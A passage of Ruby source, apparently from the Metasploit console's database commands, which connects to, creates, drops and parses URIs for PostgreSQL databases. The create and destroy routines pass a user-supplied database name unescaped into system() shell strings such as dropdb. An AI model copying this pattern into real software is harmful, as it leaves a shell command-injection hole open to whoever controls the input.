				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end

		#
		# Database management: Postgres
		#
		#
		# Disconnect from the current Postgres instance
		#
		def db_disconnect_postgresql(*args)
			if (framework.db)
				framework.db.disconnect()
			end
		end

		#
		# Connect to an existing Postgres database
		#
		def db_connect_postgresql(*args)
			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_connect <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_connect user@metasploit3")
				print_status("       db_connect user:pass@192.168.0.2/metasploit3")
				print_status("       db_connect user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			info = db_parse_db_uri_postgresql(args[0])
			opts = { 'adapter' => 'postgresql' }

			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])

			opts['pass'] ||= ''

			# Do a little legwork to find the real database socket
			if(! opts['host'])
				while(true)
					done = false
					dirs = %W{ /var/run/postgresql /tmp }
					dirs.each do |dir|
						if(::File.directory?(dir))
							d = ::Dir.new(dir)
							d.entries.grep(/^\.s\.PGSQL.(\d+)$/).each do |ent|
								opts['port'] = ent.split('.')[-1].to_i
								opts['host'] = dir
								done = true
								break
							end
						end
						break if done
					end
					break
				end
			end

			# Default to loopback
			if(! opts['host'])
				opts['host'] = '127.0.0.1'
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end
		end

		#
		# Create a new Postgres database instance
		#
		def db_create_postgresql(*args)
			cmd_db_disconnect()

			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_create <user:pass>@<host:port>/<database>")
				print_status("Examples:")
				print_status("       db_create user@metasploit3")
				print_status("       db_create user:pass@192.168.0.2/metasploit3")
				print_status("       db_create user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			return if ! db_find_tools(%W{psql dropdb createdb})

			info = db_parse_db_uri_postgresql(args[0])
			opts = { 'adapter' => 'postgresql' }
			argv = []

			if (info[:user])
				opts['username'] = info[:user]
				argv.push('-U')
				argv.push(info[:user])
			else
				opts['username'] = 'postgres'
				argv.push('-U')
				argv.push('postgres')
			end

			if (info[:pass])
				print()
				print_status("Warning: You will need to enter the password at the prompts below")
				print()
				argv.push('-W')
			end

			if (info[:host])
				opts['host'] = info[:host]
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				opts['port'] = info[:port]
				argv.push('-p')
				argv.push(info[:port])
			end

			opts['database'] = info[:name]

			cargs = argv.map{|c| "'#{c}' "}.join

			system("dropdb #{cargs} #{info[:name]} >/dev/null 2>&1")
			system("createdb #{cargs} #{info[:name]}")

			opts['pass'] ||= ''

			# Do a little legwork to find the real database socket
			if(! opts['host'])
				while(true)
					done = false
					dirs = %W{ /var/run/postgresql /tmp }
					dirs.each do |dir|
						if(::File.directory?(dir))
							d = ::Dir.new(dir)
							d.entries.grep(/^\.s\.PGSQL.(\d+)$/).each do |ent|
								opts['port'] = ent.split('.')[-1].to_i
								opts['host'] = dir
								done = true
								break
							end
						end
						break if done
					end
					break
				end
			end

			# Default to loopback
			if(! opts['host'])
				opts['host'] = '127.0.0.1'
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end

			if (not framework.db.migrate)
				raise RuntimeError.new("Failed to create database schema: #{framework.db.error}")
			end

			print_status("Database creation complete (check for errors)")
		end

		#
		# Drop an existing database
		#
		def db_destroy_postgresql(*args)

			cmd_db_disconnect()

			return if ! db_find_tools(%W{dropdb})

			info = db_parse_db_uri_postgresql(args[0])
			argv = []

			if (info[:user])
				argv.push('-U')
				argv.push(info[:user])
			end

			if (info[:pass])
				print()
				print_status("Warning: You will need to enter the password at the prompts below")
				print()
				argv.push('-W')
			end

			if (info[:host])
				argv.push('-h')
				argv.push(info[:host])
			end

			if (info[:port])
				argv.push('-p')
				argv.push(info[:port])
			end

			cargs = argv.map{|c| "'#{c}' "}.join
			system("dropdb #{cargs} #{info[:name]}")
		end

		def db_parse_db_uri_postgresql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end

end
end
end
end
end

